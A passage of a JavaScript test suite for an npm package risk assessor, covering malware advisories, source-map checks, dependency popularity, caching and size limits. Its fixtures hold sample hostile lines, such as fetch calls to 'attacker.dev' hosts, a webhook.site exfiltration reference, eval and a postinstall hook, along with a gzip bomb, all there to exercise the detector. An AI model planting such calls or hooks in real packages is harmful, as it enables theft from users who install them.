  const asked = npm(t, [{ name: 'app', versions: [before, after] }, { name: 'stranger', versions: [version('stranger', '1.0.0', { 'package.json': '{}' }, {}, ago(21))] }])
  const added = async options => Object.fromEntries((await assessNpm('app', '1.0.1', { oldVersion: '1.0.0', now: NOW, ...options })).dependencies.added.map(row => [row.name, row]))
  asked.length = 0
  assert.equal((await added({})).stranger.level, 'is-unpopular', 'npm counts none of its downloads')
  assert.ok(asked.some(url => url.includes('mine')), 'and is asked of @mine/fresh, as of any other')
  asked.length = 0
  const own = await added({ owned: name => Promise.resolve(name.startsWith('@mine/')) })
  assert.deepEqual([own['@mine/fresh'].level, own['@mine/fresh'].created, own.stranger.level], [undefined, undefined, 'is-unpopular'], 'the caller\'s own told nothing of, another as before')
  assert.ok(!asked.some(url => url.includes('mine')), 'nor its downloads nor its first publish asked')
})

test('whether each new dependency is the caller\'s own is asked four at a time, and no more once a hundred others are told', async t => {
  const scopes = Array.from({ length: 150 }, (_, i) => `@s${i}/p`)
  const before = version('wide', '1.0.0', { 'package.json': '{}' }, { dependencies: {} }, ago(30))
  const after = version('wide', '1.0.1', { 'package.json': '{}' }, { dependencies: Object.fromEntries(scopes.map(name => [name, '^1.0.0'])) }, ago(20))
  const asked = npm(t, [{ name: 'wide', versions: [before, after] }])
  let calls = 0, most = 0, running = 0
  const owned = () => {
    calls++
    most = Math.max(most, ++running)
    return new Promise(resolve => { setImmediate(() => { running--; resolve(false) }) })
  }
  await assessNpm('wide', '1.0.1', { oldVersion: '1.0.0', now: NOW, owned })
  assert.ok(most <= 4, `${most} asked at once`)
  assert.ok(calls <= 103, `${calls} asked of 150, past the hundred told`)
  assert.equal(asked.filter(url => url.startsWith('https://api.npmjs.org/downloads/range/') && /s\d+(?:%2F|\/)p$/iu.test(url)).length, 100, 'a hundred told, as before')
})

test('a file become unreadable calls for less where its source map was rebuilt with it, or in a major release, as a publisher changed does', () => {
  const side = (at, files, manifest = {}) => ({ kind: 'sourcemap', npm: { name: 'built', version: at, manifest },
    json: { version: 3, sources: Object.keys(files), sourcesContent: Object.values(files) } })
  const short = 'a\n'.repeat(10)
  const long = name => `${'x'.repeat(3000)}\n//# sourceMappingURL=${name}.map\n`
  const found = (base, other) => Object.fromEntries(npmCompareFindings(base, other, { added: [], changed: [] })
    .filter(({ id }) => id === 'now-unreadable' || id === 'publisher').map(({ id, ...finding }) => [id, finding]))
  const map = mappings => JSON.stringify({ version: 3, mappings })
  const edited = found(side('1.0.0', { 'a.js': short, 'a.js.map': map('A') }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': map('A') }))
  assert.equal(edited['now-unreadable'].severity, 'critical', 'its map as it was')
  const rebuilt = found(side('1.0.0', { 'a.js': short, 'a.js.map': map('A') }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': map('B') }))
  assert.equal(rebuilt['now-unreadable'].severity, 'high')
  assert.deepEqual(rebuilt['now-unreadable'].files.map(row => row.rebuilt), [true])
  assert.equal(found(side('1.0.0', { 'a.css': short, 'a.css.map': map('A') }), side('1.0.1', { 'a.css': `${'x'.repeat(3000)}\n/*# sourceMappingURL=a.css.map */\n`, 'a.css.map': map('B') }))['now-unreadable']?.severity,
    'high', 'its map named in a block comment')
  const indexed = sections => JSON.stringify({ version: 3, sections: [{ offset: { line: 0, column: 0 }, map: JSON.parse(map(sections)) }] })
  assert.equal(found(side('1.0.0', { 'a.js': short, 'a.js.map': indexed('A') }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': indexed('B') }))['now-unreadable'].severity,
    'high', 'an indexed map rebuilt')
  assert.equal(found(side('1.0.0', { 'a.js': short, 'a.js.map': indexed('A') }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': '{"version":3,"sections":[null]}' }))['now-unreadable'].severity,
    'critical', 'an indexed map whose sections are none')
  const elsewhere = found(side('1.0.0', { 'lib/a.js': short, 'lib/a.js.map': map('A'), 'maps/a.map': map('A') }),
    side('1.0.1', { 'lib/a.js': `${'x'.repeat(3000)}\n//# sourceMappingURL=../maps/a.map\n`, 'lib/a.js.map': map('B'), 'maps/a.map': map('A') }))
  assert.equal(elsewhere['now-unreadable'].severity, 'critical', 'the map it names as it was, whatever map beside it changed')
  const named = found(side('1.0.0', { 'lib/a.js': short, 'maps/a.map': map('A') }),
    side('1.0.1', { 'lib/a.js': `${'x'.repeat(3000)}\n//# sourceMappingURL=../maps/a.map\n`, 'maps/a.map': map('B') }))
  assert.equal(named['now-unreadable'].severity, 'high', 'the map it names, by a path from its own, rebuilt')
  const inline = found(side('1.0.0', { 'a.js': short, 'a.js.map': map('A') }),
    side('1.0.1', { 'a.js': `${'x'.repeat(3000)}\n//# sourceMappingURL=data:application/json;base64,e30=\n`, 'a.js.map': map('B') }))
  assert.equal(inline['now-unreadable'].severity, 'critical', 'a map inline is no map rebuilt beside it')
  for (const name of ['/a.js.map', '//cdn.example/a.js.map', '\\\\cdn.example/a.js.map', '/package/lib/a.js.map', 'https://package.invalid/package/lib/a.js.map', 'https://one.invalid/one/lib/a.js.map', '//two.invalid/two/lib/a.js.map', '/one/lib/a.js.map', 'cdn.example%2Fa.js.map', 'a.js.map*elsewhere', 'a.js.map#x']) {
    const rooted = found(side('1.0.0', { 'lib/a.js': short, 'lib/a.js.map': map('A'), 'lib/cdn.example/a.js.map': map('A') }),
      side('1.0.1', { 'lib/a.js': `${'x'.repeat(3000)}\n//# sourceMappingURL=${name}\n`, 'lib/a.js.map': map('B'), 'lib/cdn.example/a.js.map': map('B') }))
    assert.equal(rooted['now-unreadable'].severity, 'critical', `${name}: a map from a site's root or another host is none beside it`)
  }
  for (const [path, name] of [['a.js', '../a.js.map'], ['lib/a.js', '../../a.js.map'], ['lib/a.js', '%2e%2e/%2E%2e/a.js.map']]) {
    const above = found(side('1.0.0', { [path]: short, 'a.js.map': map('A') }),
      side('1.0.1', { [path]: `${'x'.repeat(3000)}\n//# sourceMappingURL=${name}\n`, 'a.js.map': map('B') }))
    assert.equal(above['now-unreadable'].severity, 'critical', `${path} naming ${name}: a map above the package is none of its own`)
  }
  const encoded = found(side('1.0.0', { 'lib/a.js': short, 'a.js.map': map('A'), 'lib/%2e%2e/a.js.map': map('A') }),
    side('1.0.1', { 'lib/a.js': `${'x'.repeat(3000)}\n//# sourceMappingURL=%2e%2e/a.js.map\n`, 'a.js.map': map('A'), 'lib/%2e%2e/a.js.map': map('B') }))
  assert.equal(encoded['now-unreadable'].severity, 'critical', 'the map an encoded `..` names, as a browser resolves it, as it was')
  const text = 'module.exports = function long() { return 42 }\n'.repeat(40)
  const grown = `${text}${'x'.repeat(3000)}\n//# sourceMappingURL=a.js.map\n`
  const renamed = (was, now) => found(side('1.0.0', { 'src/a.js': text, ...was }), side('1.0.1', { 'dist/a.js': grown, ...now }))['now-unreadable'].severity
  assert.deepEqual([renamed({ 'dist/a.js.map': map('A') }, { 'dist/a.js.map': map('A') }), renamed({ 'src/a.js.map': map('A') }, { 'dist/a.js.map': map('A') }),
    renamed({ 'src/a.js.map': map('A') }, { 'dist/a.js.map': map('B') })], ['critical', 'critical', 'high'], 'renamed: the map where it lands as it was, or moved with it as it was; rebuilt')
  const manifest = found(side('1.0.0', { 'a.js': short, 'package.json': '{"version":"1.0.0"}' }),
    side('1.0.1', { 'a.js': `${'x'.repeat(3000)}\n//# sourceMappingURL=package.json\n`, 'package.json': '{"version":"1.0.1"}' }))
  assert.equal(manifest['now-unreadable'].severity, 'critical', 'a file it names that is no source map, changed as it may be')
  const fake = found(side('1.0.0', { 'a.js': short, 'a.js.map': 'x' }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': 'y' }))
  assert.equal(fake['now-unreadable'].severity, 'critical', 'a .map that is no source map')
  const mixed = found(side('1.0.0', { 'a.js': short, 'a.js.map': map('A'), 'b.js': short }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': map('B'), 'b.js': long('b.js') }))
  assert.equal(mixed['now-unreadable'].severity, 'critical', 'one file of them unexplained')
  const major = found(side('1.4.1', { 'a.js': short }, { publisher: 'known', knownAccounts: ['known'] }), side('2.0.0', { 'a.js': long('a.js') }, { publisher: 'new' }))
  assert.deepEqual([major['now-unreadable'].severity, major['now-unreadable'].major, major.publisher.severity, major.publisher.major], ['high', true, 'high', true])
  assert.equal(found(side('0.1.5', { 'a.js': short }), side('0.2.0', { 'a.js': long('a.js') }))['now-unreadable'].severity, 'high', '0.x: its minor is its major')
  assert.equal(found(side('1.4.1', { 'a.js': short }), side('1.5.0', { 'a.js': long('a.js') }))['now-unreadable'].severity, 'critical', 'a minor release')
})

test('what is read is kept by type, and an assessment kept needs no tarball', async t => {
  const files = { 'package.json': '{}', 'index.js': 'eval(x)\n' }
  const asked = npm(t, [{ name: 'kept', versions: [version('kept', '1.0.0', files, { dependencies: {} }, ago(400)), version('kept', '1.1.0', { ...files, 'more.js': 'fetch("https://collector.attacker.dev/x")' }, { dependencies: {} }, ago(300))] }],
    { kept: { start: '2026-08-01', end: '2026-10-11', days: Array.from({ length: 72 }, () => 10) } })
  const cache = store()
  const first = await assessNpm('kept', '1.1.0', { oldVersion: '1.0.0', now: NOW, cache })
  assert.deepEqual(ids(first), ['kept-runs-code', 'new-hosts', 'popularity'], 'eval kept from 1.0.0; a host named anew; few downloads')
  assert.deepEqual(first.findings.at(-1), { id: 'popularity', severity: 'critical', tier: null, level: 'is-unpopular' })
  assert.deepEqual([...cache.written].toSorted(), ['npm/tarballs', 'risk/npm/advisories', 'risk/npm/assessments', 'risk/npm/downloads', 'risk/npm/packages', 'risk/npm/versions'])
  asked.length = 0
  assert.deepEqual(await assessNpm('kept', '1.1.0', { oldVersion: '1.0.0', now: NOW, cache }), first)
  assert.deepEqual(asked, [], 'everything kept: npm isn\'t asked')
  asked.length = 0
  await assessNpm('kept', '1.1.0', { oldVersion: '1.0.0', now: NOW + DAY, cache })
  assert.deepEqual(asked.map(url => url.replace(/range\/[^/]+/u, 'range/…')).toSorted(), [`${REGISTRY}/kept`, ADVISORIES, OSV, 'https://api.npmjs.org/downloads/range/…/kept'].toSorted(),
    'a day on, its deprecations and advisories asked again, as they are after an hour, and its downloads, another day\'s; no tarball')
})

test('an advisory is of malware where GitHub files it as embedded malicious code, or its title says so', () => {
  assert.equal(npmMalwareAdvisory({ cwe: ['CWE-506'], title: 'Critical severity vulnerability that affects event-stream and flatmap-stream' }), true)
  assert.equal(npmMalwareAdvisory({ cwe: ['CWE-94', 'CWE-506'], title: 'Embedded Malicious Code in node-ipc' }), true)
  assert.equal(npmMalwareAdvisory({ cwe: [], title: 'Malware in chalk' }), true)
  assert.equal(npmMalwareAdvisory({ id: 'MAL-2025-41443', cwe: [], title: 'Malicious code in nx (npm)' }), true, 'OSV\'s of a malicious package')
  assert.equal(npmMalwareAdvisory({ cwe: ['CWE-200'], title: 'Modified package published to npm, containing malware that exfiltrates private key material' }), true,
    '@solana/web3.js\'s GHSA-jcxm-7wvp-g6p5, its CWE not')
  assert.equal(npmMalwareAdvisory({ cwe: ['CWE-601'], title: 'Open redirect to a malicious URL' }), false, 'not every malicious thing is malware')
  assert.equal(npmMalwareAdvisory({ cwe: ['CWE-1321'], title: 'Prototype Pollution in lodash' }), false)
})

// An advisory as npm's registry answers `npm audit`, of malware unless its
// `cwe` says otherwise.
const advisory = (id, ghsa, title, range, cwe = ['CWE-506']) => ({ id, url: `https://github.com/advisories/${ghsa}`, title, severity: 'critical',
  vulnerable_versions: range, cwe, cvss: { score: 0, vectorString: null } })

test('malware first: a package npm took down, whatever version is asked, and an advisory of malware naming it; one npm removed told of by it alone', async t => {
  const holder = { description: 'security holding package', repository: { type: 'git', url: 'git+https://github.com/npm/security-holder.git' }, _npmUser: { name: 'npm', email: 'npm@npmjs.com' } }
  const left = version('taken', '1.0.0', { 'package.json': '{}' }, { dependencies: {} }, ago(400))
  const placeholder = version('taken', '0.0.1-security', { 'package.json': '{}', 'README.md': '# Security holding package' }, { dependencies: {}, ...holder }, ago(300))
  const kept = version('kept', '2.0.0', { 'package.json': '{}' }, { dependencies: {}, deprecated: 'use kept 3' }, ago(30))
  const posing = version('posing', '0.0.1-security', { 'package.json': '{}' }, { dependencies: {}, ...holder, _npmUser: { name: 'someone', email: 's@example.com' } }, ago(300))
  const asked = npm(t, [{ name: 'taken', versions: [left, placeholder], latest: '0.0.1-security' }, { name: 'kept', versions: [kept], removed: { '2.0.1': ago(20), '2.0.2': ago(10) } },
    { name: 'posing', versions: [posing] }], {}, {
    kept: [advisory(1, 'GHSA-aaaa-bbbb-cccc', 'Critical severity vulnerability that affects kept', '=2.0.1'),
      advisory(2, 'GHSA-dddd-eeee-ffff', 'Modified package published to npm, containing malware that exfiltrates keys', '=2.0.0', ['CWE-200']),
      advisory(3, 'GHSA-gggg-hhhh-jjjj', 'Prototype Pollution in kept', '<3.0.0', ['CWE-1321'])],
  })
  const assessed = (name, number, options = {}) => assessNpm(name, number, { now: NOW, downloads: false, ...options })
  for (const number of ['1.0.0', '0.0.1-security']) {
    assert.deepEqual((await assessed('taken', number)).findings[0], { id: 'malware', severity: 'critical', takenDown: true }, `taken@${number}: its package taken down`)
  }
  assert.ok(!(await assessed('posing', '0.0.1-security')).findings.some(({ id }) => id === 'malware'), 'a placeholder published by any account but npm\'s is none')
  const named = await assessed('kept', '2.0.0')
  assert.deepEqual(named.findings[0], { id: 'malware', severity: 'critical', advisories: [{ id: 'GHSA-dddd-eeee-ffff', url: 'https://github.com/advisories/GHSA-dddd-eeee-ffff',
    title: 'Modified package published to npm, containing malware that exfiltrates keys' }] }, 'its title says malware, its CWE not; a vulnerability isn\'t')
  assert.deepEqual(ids(named).slice(0, 2), ['malware', 'deprecated'], 'before its deprecation')
  asked.length = 0
  const removed = await assessed('kept', '2.0.1')
  assert.deepEqual(removed, { name: 'kept', version: '2.0.1', oldVersion: null, published: ago(20), removed: true, files: {}, dependencies: { added: [], changed: [] },
    findings: [{ id: 'malware', severity: 'critical', advisories: [{ id: 'GHSA-aaaa-bbbb-cccc', url: 'https://github.com/advisories/GHSA-aaaa-bbbb-cccc', title: 'Critical severity vulnerability that affects kept' }] }] },
  'CWE-506, whatever its title; nothing of it left to read')
  assert.ok(!asked.some(url => url.endsWith('.tgz')), 'no tarball asked')
  assert.deepEqual(await assessed('kept', '2.0.1', { oldVersion: true }), removed, 'nor a version picked to compare it with')
  await assert.rejects(assessed('kept', '2.0.2'), error => error.code === 'version-not-found', 'one removed with no malware told of: as npm has none')
  await assert.rejects(assessed('kept', '2.0.0', { oldVersion: '2.0.1' }), error => error.code === 'version-not-found', 'nor is one removed compared with')
  asked.length = 0
  assert.ok(!(await assessed('kept', '2.0.0', { advisories: false })).findings.some(({ id }) => id === 'malware'), 'its advisories not asked')
  assert.ok(!asked.includes(ADVISORIES))
})

test('a version npm removes once its facts are kept is told as removed, by its package\'s record, kept an hour, of which npm removed', async t => {
  const first = version('pulled', '1.0.0', { 'package.json': '{}' }, { dependencies: {} }, ago(40))
  const bad = version('pulled', '1.0.1', { 'package.json': '{}' }, { dependencies: {} }, ago(30))
  const plain = version('pulled', '1.0.2', { 'package.json': '{}' }, { dependencies: {} }, ago(20))
  const pkg = { name: 'pulled', versions: [first, bad, plain] }
  npm(t, [pkg], {}, { pulled: [advisory(1, 'GHSA-pppp-qqqq-rrrr', 'Malware in pulled', '=1.0.1')] })
  const cache = store()
  const assessed = (number, at) => assessNpm('pulled', number, { now: at, downloads: false, cache })
  assert.equal((await assessed('1.0.1', NOW)).removed, undefined, 'published: its facts kept')
  await assessed('1.0.2', NOW)
  Object.assign(pkg, { versions: [first], removed: { '1.0.1': ago(30), '1.0.2': ago(20) } })
  for (const at of [NOW + 2 * HOUR, NOW + 2.5 * HOUR]) {
    const removed = await assessed('1.0.1', at)
    assert.deepEqual([removed.removed, ids(removed)], [true, ['malware']], `${(at - NOW) / HOUR} hours on: removed, its malware told`)
    await assert.rejects(assessed('1.0.2', at), error => error.code === 'version-not-found', `${(at - NOW) / HOUR} hours on: removed with no malware told of`)
  }
})

test('a version npm removes once a version was picked to compare it with is compared with none, its pick kept or not', async t => {
  const versions = ['1.0.0', '1.0.1', '1.1.0'].map((number, i) => version('repicked', number, { 'package.json': '{}' }, { dependencies: {} }, ago(400 - 100 * i)))
  const pkg = { name: 'repicked', versions }
  npm(t, [pkg], {}, { repicked: [advisory(1, 'GHSA-ssss-tttt-uuuu', 'Malware in repicked', '=1.1.0')] })
  const cache = store()
  const assessed = () => assessNpm('repicked', '1.1.0', { oldVersion: true, now: NOW, downloads: false, cache })
  assert.equal((await assessed()).oldVersion, '1.0.1', 'picked while published')
  cache.kept.delete('risk/npm/packages repicked')
  Object.assign(pkg, { versions: versions.slice(0, 2), removed: { '1.1.0': ago(200) } })
  for (const when of ['its package\'s record gone, its pick kept', 'its package\'s record kept again']) {
    const removed = await assessed()
    assert.deepEqual([removed.removed, removed.oldVersion, ids(removed)], [true, null, ['malware']], when)
  }
})

test('OSV\'s records of malware npm\'s advisories haven\'t tell of it too, as the malicious packages\' of nx\'s versions do; one npm\'s have told once', async t => {
  const osvRecord = (id, summary, aliases = [], cwe = []) => ({ id, summary, aliases, database_specific: { cwe_ids: cwe } })
  const listed = version('listed', '1.0.0', { 'package.json': '{}' }, { dependencies: {} }, ago(30))
  npm(t, [{ name: 'listed', versions: [listed], removed: { '1.0.1': ago(20) } }], {}, {
    listed: [advisory(1, 'GHSA-aaaa-bbbb-cccc', 'Malware in listed', '=1.0.0')],
  }, {
    'listed@1.0.0': [osvRecord('MAL-2025-00001', 'Malicious code in listed (npm)', ['GHSA-aaaa-bbbb-cccc']), osvRecord('GHSA-dddd-eeee-ffff', 'Prototype Pollution in listed', [], ['CWE-1321'])],
    'listed@1.0.1': [osvRecord('MAL-2025-00002', 'Malicious code in listed (npm)', ['GHSA-gggg-hhhh-jjjj'])],
  })
  const malware = async number => (await assessNpm('listed', number, { now: NOW, downloads: false })).findings.find(({ id }) => id === 'malware')
  assert.deepEqual((await malware('1.0.0')).advisories.map(({ id }) => id), ['GHSA-aaaa-bbbb-cccc'], 'OSV\'s of npm\'s told once; its vulnerability none')
  assert.deepEqual((await malware('1.0.1')).advisories, [{ id: 'MAL-2025-00002', url: 'https://osv.dev/vulnerability/MAL-2025-00002', title: 'Malicious code in listed (npm)' }],
    'a version npm removed, its malware OSV\'s alone')
})

test('OSV\'s records are read page by page, as it pages what it can\'t answer at once, and never asked of where `osv` is false', async t => {
  const paged = ['1.0.0', '1.0.1'].map(number => version('paged', number, { 'package.json': '{}' }, { dependencies: {} }, ago(30)))
  const asked = npm(t, [{ name: 'paged', versions: paged }], {}, {}, {
    'paged@1.0.0': { pages: [[], [{ id: 'MAL-2025-00003', summary: 'Malicious code in paged (npm)', aliases: [] }]] },
    'paged@1.0.1': { pages: Array.from({ length: 11 }, () => []) },
  })
  const assessed = (number, options = {}) => assessNpm('paged', number, { now: NOW, downloads: false, ...options })
  assert.deepEqual((await assessed('1.0.0')).findings.find(({ id }) => id === 'malware')?.advisories?.map(({ id }) => id), ['MAL-2025-00003'],
    'its malware on a page after one OSV answered with none')
  await assert.rejects(assessed('1.0.1'), error => error instanceof NpmRiskError && error.code === 'upstream-invalid', 'past OSV_PAGES')
  asked.length = 0
  assert.ok(!ids(await assessed('1.0.0', { osv: false })).includes('malware'), 'OSV not asked, its malware not told')
  assert.ok(!asked.includes(OSV), 'nor its name sent')
})

test('npm having no such package or version is said so', async t => {
  npm(t, [{ name: 'there', versions: [version('there', '1.0.0', { 'package.json': '{}' }, {}, ago(30))] }])
  await assert.rejects(assessNpm('there', '9.9.9', { now: NOW }), error => error instanceof NpmRiskError && error.code === 'version-not-found')
  await assert.rejects(assessNpm('missing', '1.0.0', { now: NOW }), error => error instanceof NpmRiskError && error.code === 'package-not-found')
})

test('a tarball unpacking past risk\'s bounds is given up on as it unpacks', async t => {
  const bomb = version('bomb', '1.0.0', { 'package.json': '{}' }, {}, ago(30))
  bomb.tgz = gzipSync(Buffer.alloc(MAX_TAR_BYTES + 1))
  bomb.doc.dist.integrity = `sha512-${createHash('sha512').update(bomb.tgz).digest('base64')}`
  await assert.rejects(npmTarballVersion(bomb.tgz), /package-too-large/u)
  npm(t, [{ name: 'bomb', versions: [bomb] }])
  await assert.rejects(assessNpm('bomb', '1.0.0', { now: NOW, downloads: false }), error => error instanceof NpmRiskError && error.code === 'package-too-large')
})

test('npm\'s documents read within bounds: risk\'s own, or the caller\'s in its stead', async t => {
  const MiB = new Uint8Array(1024 * 1024)
  const endless = () => { let sent = 0; return new ReadableStream({ pull: controller => { if (sent++ > 64) controller.close(); else controller.enqueue(MiB) } }) }
  t.mock.method(globalThis, 'fetch', () => Promise.resolve(new Response(endless())))
  await assert.rejects(assessNpm('huge', '1.0.0', { now: NOW }), error => error instanceof NpmRiskError && error.code === 'upstream-too-large', 'past 64 MiB, no length said')
  t.mock.restoreAll()
  const own = { name: 'hooked', versions: [version('hooked', '1.0.0', { 'package.json': '{}' }, { dependencies: { 'dep-like': '^1.0.0' } }, ago(30))] }
  const dependency = { name: 'dep-like', versions: [version('dep-like', '1.0.0', { 'package.json': '{}' }, {}, ago(31))] }
  const asked = npm(t, [own, dependency]), read = []
  const packument = (name, { authorized }) => { read.push([name, authorized]); return Promise.resolve(documentOf(name === 'hooked' ? own : dependency)) }
  const tarball = (name, number) => { read.push([`${name}@${number}`]); return Promise.resolve(own.versions[0].tgz) }
  const assessment = await assessNpm('hooked', '1.0.0', { now: NOW, packument, tarball })
  assert.deepEqual(read, [['hooked', true], ['hooked@1.0.0'], ['dep-like', false]], 'the package assessed with the caller\'s token, its dependency without; its tarball the caller\'s')
  assert.ok(!asked.some(url => url.startsWith(REGISTRY) && url !== ADVISORIES), 'npm\'s registry asked for no document nor tarball')
  const busy = new Error('npm-busy')
  await assert.rejects(assessNpm('hooked', '1.0.0', { now: NOW, packument, tarball: () => Promise.reject(busy) }), error => error === busy, 'a caller\'s failure thrown as it is')
  assert.equal(assessment.dependencies.added[0].level, 'is-unpopular', 'its document read: public, none of its downloads counted')
})

test('npm asked of at most 100 dependencies added, the rest left unknown; npm unreachable said so', async t => {
  const dependencies = Object.fromEntries(Array.from({ length: 120 }, (_, i) => [`dep-${String(i).padStart(3, '0')}`, '^1.0.0']))
  const asked = npm(t, [{ name: 'many', versions: [version('many', '1.0.0', { 'package.json': '{}' }, { dependencies }, ago(30))] }])
  const { added } = (await assessNpm('many', '1.0.0', { now: NOW })).dependencies
  assert.equal(added.length, 120)
  const downloads = asked.filter(url => url.startsWith('https://api.npmjs.org/downloads/range/')).map(url => url.split('/').at(-1)).filter(name => name !== 'many')
  assert.deepEqual(downloads.toSorted(), Object.keys(dependencies).slice(0, 100))
  t.mock.method(globalThis, 'fetch', () => Promise.reject(new TypeError('fetch failed')))
  await assert.rejects(assessNpm('many', '1.0.0', { now: NOW }), error => error instanceof NpmRiskError && error.code === 'upstream-unavailable')
})

test('npm asking to be asked later is busy, not unavailable, and says what was asked', async t => {
  npm(t, [{ name: 'throttled', versions: [version('throttled', '1.0.0', { 'package.json': '{}' }, {}, ago(30))] }])
  const answer = globalThis.fetch
  t.mock.method(globalThis, 'fetch', (url, init) => String(url).startsWith('https://api.npmjs.org/downloads/')
    ? Promise.resolve(new Response('', { status: 429 })) : answer(url, init))
  await assert.rejects(assessNpm('throttled', '1.0.0', { now: NOW }),
    error => error instanceof NpmRiskError && error.code === 'upstream-busy' && error.message === 'npm answered 429 for throttled\'s downloads')
})

test('a tarball read as npm installs it, and two versions\' files paired as Compare pairs them', async () => {
  const { tgz } = packageOf('read', '1.0.0', { 'package.json': '{}', 'b.js': 'b', 'a/c.js': 'c', 'bin/tool': '\0\u0001' })
  const read = await npmTarballVersion(tgz)
  assert.deepEqual(read.json, { version: 3, sources: ['a/c.js', 'b.js', 'bin/tool', 'package.json'], sourcesContent: ['c', 'b', null, '{}'] }, 'sorted; one with a NUL no text')
  assert.equal(read.fileSizes.get('bin/tool'), 2)
  assert.deepEqual(read.npmBinaries, new Map([['bin/tool', { size: 2, digest: `sha256-${createHash('sha256').update('\0\u0001').digest('base64')}` }]]), 'one not text told by its digest, as the server gives it')
  const side = files => ({ kind: 'sourcemap', json: { version: 3, sources: Object.keys(files), sourcesContent: Object.values(files) } })
  const text = 'module.exports = function long() { return 42 }\n'.repeat(20)
  assert.deepEqual(npmFilesDiff(side({ 'old.js': text, 'same.js': 'x', 'edit.js': '1' }), side({ 'new.js': text, 'same.js': 'x', 'edit.js': '2', 'add.js': 'y' })),
    { onlyOther: [{ path: 'add.js' }], changed: [{ path: 'edit.js', modified: true }, { path: 'new.js', renamedFrom: 'old.js', modified: false }] })
})

test('a file that isn\'t text compared by its digest: one added large is large code, one kept unchanged', async t => {
  const packed = Buffer.alloc(256 * 1024, 0xff), tool = Buffer.from([0, 1, 2])
  const before = version('bin-like', '1.0.0', { 'package.json': '{}', 'bin/tool': tool }, { dependencies: {} }, ago(30))
  const after = version('bin-like', '1.0.1', { 'package.json': '{}', 'bin/tool': tool, 'dist/packed.js': packed }, { dependencies: {} }, ago(20))
  npm(t, [{ name: 'bin-like', versions: [before, after] }])
  const assessment = await assessNpm('bin-like', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })
  assert.deepEqual(assessment.findings, [{ id: 'large-code', severity: 'critical', files: [{ path: 'dist/packed.js', bytes: 256 * 1024 }] }], 'not UTF-8, yet added; bin/tool unchanged')
})

test('what a file holds read to a bound: the first 100 places of each kind, 1,000 hosts', () => {
  const lines = (count, line) => Array.from({ length: count }, (_, i) => line(i)).join('\n')
  const first = count => Array.from({ length: count }, (_, i) => i + 1)
  const evals = lines(150, () => 'eval(x)')
  assert.deepEqual(npmFileRisk('lib/a.js', evals, evals.length).runsCode, new Map([['eval', first(100)]]))
  const said = lines(150, () => '// see https://webhook.site/x')
  assert.deepEqual(npmFileRisk('lib/b.js', said, said.length).exfiltration, new Map([['webhook-site', first(100)]]))
  const named = lines(1200, i => `fetch("https://h${i}.attacker.dev/")`)
  const { hosts } = npmFileRisk('lib/c.js', named, named.length)
  assert.deepEqual([hosts.size, hosts.get('h999.attacker.dev'), hosts.has('h1000.attacker.dev')], [1000, 1000, false])
  assert.equal(linesNote(first(100)), 'lines 1, 2, 3, 4, 5 and 95+ more', 'as many as risk keeps: some more yet')
  assert.equal(linesNote(first(99)), 'lines 1, 2, 3, 4, 5 and 94 more')
})

test('an assessment given up on as its signal aborts, upstream\'s download still on its way', async t => {
  const slow = version('slow', '1.0.0', { 'package.json': '{}' }, {}, ago(30))
  let arrive = () => {}
  const fetching = new Promise(resolve => {
    t.mock.method(globalThis, 'fetch', input => {
      if (String(input) === ADVISORIES) return Promise.resolve(Response.json({}))
      if (String(input) !== slow.doc.dist.tarball) return Promise.resolve(Response.json(documentOf({ name: 'slow', versions: [slow] })))
      resolve()
      return new Promise(answer => { arrive = () => answer(new Response(slow.tgz)) })
    })
  })
  const controller = new AbortController()
  const assessed = assessNpm('slow', '1.0.0', { now: NOW, downloads: false, signal: controller.signal })
  await fetching
  controller.abort(new Error('caller gone'))
  await assert.rejects(assessed, /caller gone/u)
  arrive()
})

test('an assessment whose signal aborts before its advisories are asked asks none, nor waits', async t => {
  const late = { name: 'late', versions: [version('late', '1.0.0', { 'package.json': '{}' }, {}, ago(30))] }
  const asked = []
  t.mock.method(globalThis, 'fetch', input => { asked.push(String(input)); return new Promise(() => {}) })
  const controller = new AbortController()
  const packument = () => { controller.abort(new Error('caller gone')); return Promise.resolve(documentOf(late)) }
  await assert.rejects(assessNpm('late', '1.0.0', { now: NOW, downloads: false, signal: controller.signal, packument }), /caller gone/u)
  assert.deepEqual(asked, [], 'npm\'s advisories not asked')
})

test('a new dependency\'s package told by its downloads but its latest two weeks\', and its age where it is new since the version compared with', () => {
  const now = Date.parse('2026-10-12T12:00:00Z')
  const days = (perDay, latest = perDay) => ({ start: '2026-08-01', end: '2026-10-11', days: Array.from({ length: 72 }, (_, i) => i < 58 ? perDay : latest) })
  assert.deepEqual(npmSettledDownloads(days(100, 1e6), now), { start: '2026-08-01', end: '2026-09-27', days: Array.from({ length: 58 }, () => 100) }, 'to the day before its latest two weeks')
  assert.equal(npmAddedDependency({ downloads: days(100, 1e6) }, now).tier, Infinity, 'just pulled in, 1M a day of late: unpopular as it was')
  assert.deepEqual([npmAddedDependency({ downloads: days(4e6) }, now)].map(({ tier, wanted }) => [tier, wanted]), [[2000, false]], 'in the top 20,000: its age not asked')
  const axios = ['2026-03-27T19:01:40.000Z', '2026-03-31T00:21:58.000Z']
  assert.deepEqual(npmAddedDependency({ downloads: null, listed: { created: '2026-03-30T05:57:32.867Z', private: false }, published: axios }, now),
    { tier: Infinity, wanted: true, created: '2026-03-30T05:57:32.867Z', gap: 66_265_133 }, 'none counted: unpopular, and new since the version compared with')
  assert.equal(npmAddedDependency({ downloads: null, listed: { created: '2026-03-30T05:57:32.867Z', private: true }, published: axios }, now).tier, null, 'a private one: not told')
  assert.equal(npmAddedDependency({ downloads: days(0), listed: { created: '2020-01-01T00:00:00.000Z', private: false }, published: axios }, now).created, null, 'not one that existed before')
})

test('a version document read for what risk reads of it', () => {
  const [known] = publishers
  assert.deepEqual(npmVersionManifest({ _npmUser: { name: known, email: 'x@example.com' }, deprecated: 'use another', scripts: { prepare: 'tsc', postinstall: 'node x.js' },
    dependencies: { a: '1' }, devDependencies: { b: '1' }, dist: { attestations: { provenance: {} } } }),
  { deprecated: 'use another', publisher: known, knownAccounts: [known], dependencies: { a: '1' }, provenance: true, installScripts: { postinstall: 'node x.js' } })
